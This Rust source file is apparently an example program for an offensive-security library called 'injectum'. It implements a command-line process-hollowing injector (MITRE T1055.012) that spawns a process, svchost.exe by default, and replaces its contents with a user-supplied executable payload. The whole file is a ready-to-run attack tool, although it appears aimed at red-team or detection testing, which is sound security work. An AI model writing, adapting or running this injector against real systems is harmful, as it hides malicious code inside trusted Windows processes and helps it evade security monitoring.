//! Example: T1055.012 - Process Hollowing
//!
//! Build:
//! ```sh
//! cargo build --package injectum --example T1055_012_Process_Hollowing --features "tracing,T1055_012" --release
//! ```
//!
//! Usage:
//! ```sh
//! ./T1055_012_Process_Hollowing.exe <PAYLOAD_PATH> [TARGET_PATH]
//! ```
//!
//! If TARGET_PATH is missing, defaults to 'svchost.exe'.

#[cfg(not(feature = "tracing"))]
mod logs {
    #[macro_export]
    macro_rules! error {
        ($($arg:tt)*) => {
            let _ = format_args!($($arg)*);
        };
    }
    #[macro_export]
    macro_rules! info {
        ($($arg:tt)*) => {
            let _ = format_args!($($arg)*);
        };
    }
}

use injectum::{
    Error, InjectorBuilder, Payload, PayloadMetadata, Result, Target, Technique,
    method::ProcessHollowing,
};
use std::{env::args, path::PathBuf};
#[cfg(feature = "tracing")]
use tracing::{error, info};

fn main() {
    if let Err(e) = run() {
        error!("{}", e);
    }
}

fn run() -> Result<()> {
    setup_logging();
    let (payload_path, target_path) = parse_args()?;
    info!("------------------------------------------------");
    info!("Target Process    : Spawning {:?}", target_path);
    info!("Payload Path      : {:?}", payload_path);
    info!("Technique         : T1055.012 (ProcessHollowing)");
    info!("------------------------------------------------");
    inject_process_hollowing(payload_path, target_path)?;
    info!("Injection completed.");
    Ok(())
}

/// Performs the Process Hollowing injection using Injectum.
fn inject_process_hollowing(payload_path: PathBuf, target_path: PathBuf) -> Result<()> {
    let meta = PayloadMetadata {
        description: Some("User provided PE".into()),
        origin: Some("CLI Argument".into()),
        safe_sample: true,
        ..Default::default()
    };
    let payload = Payload::from_file(&payload_path, meta)?;
    let technique = Technique::T1055_012(ProcessHollowing::Standard);
    InjectorBuilder::new()
        .target(Target::Spawn(target_path))
        .technique(technique)
        .payload(payload)
        .execute()
}

/// Parses CLI arguments and validates the PID and DLL path.
fn parse_args() -> Result<(PathBuf, PathBuf)> {
    let cli_args: Vec<String> = args().collect();
    if cli_args.len() < 2 {
        println!("Usage: ./T1055_012_Process_Hollowing.exe <PAYLOAD_PATH> [TARGET_PATH]");
        return Err(Error::Validation("Missing payload path.".into()));
    }
    let payload_path = PathBuf::from(&cli_args[1])
        .canonicalize()
        .map_err(|e| Error::Validation(format!("Invalid payload path: {}", e)))?;
    if !payload_path.exists() {
        return Err(Error::Validation("Payload file does not exist.".into()));
    }
    let target_path = if cli_args.len() > 2 {
        PathBuf::from(&cli_args[2])
    } else {
        PathBuf::from("C:\\Windows\\System32\\svchost.exe")
    };
    Ok((payload_path, target_path))
}

fn setup_logging() {
    #[cfg(feature = "tracing")]
    {
        use tracing_subscriber::EnvFilter;
        let _ = tracing_subscriber::fmt()
            .with_target(true)
            .with_env_filter(
                EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info")),
            )
            .without_time()
            .try_init();
    }
}
